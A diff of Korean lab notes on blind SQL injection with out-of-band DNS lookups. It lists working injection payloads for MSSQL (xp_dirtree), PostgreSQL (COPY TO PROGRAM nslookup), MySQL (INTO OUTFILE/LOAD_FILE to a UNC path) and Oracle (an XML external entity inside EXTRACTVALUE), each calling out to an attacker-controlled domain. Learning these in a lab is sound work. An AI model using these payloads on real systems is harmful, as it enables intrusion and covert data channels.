@@ -13,7 +13,7 @@ To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup 
  1) microsoft db인가? >>> TrackingId= asdawd'; exec master..xp_dirtree "//[내 도메인]/a"--  --> xp_dirtree = 파일의 디렉토리를 조사하여 테이블로 반환
   `//`는 원격에 있는 공유폴더를 뜻함. 따라서 [내 도메인]/a의 디렉토리를 볼려고 DNS질의하며 접근. 근데 여기서는 로그 안찍혔음. MSsql은 아니고..
  2) PostgreSQL 인가?? >>> TrackingId= asdawd'; COPY (SELECT '') to program 'nslookup [내 도메인]'-- -> 안 먹힘.
- 3) MySQL 인가??? >>> ' INTO OUTFILE '\\\\[내 도메인]\\a'--#  이거 아니면 ' UNION SELECT LOADFILE('\\\\[내 도메인]\\a')--#
+ 3) MySQL 인가??? >>> ' INTO OUTFILE '\\\\[내 도메인]\\a'--%20  이거 아니면 ' UNION SELECT LOADFILE('\\\\[내 도메인]\\a')--%20
   아...아니네..
  4) Oracle인가보네.. >>> TrackinId = asdawd' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding = "UTF-8"?>
 <!DOTYPE root [<!ENTITY % remote SYSTEM "http://[내 도메인]/"> %remote;]>'), '/l') FROM dual--
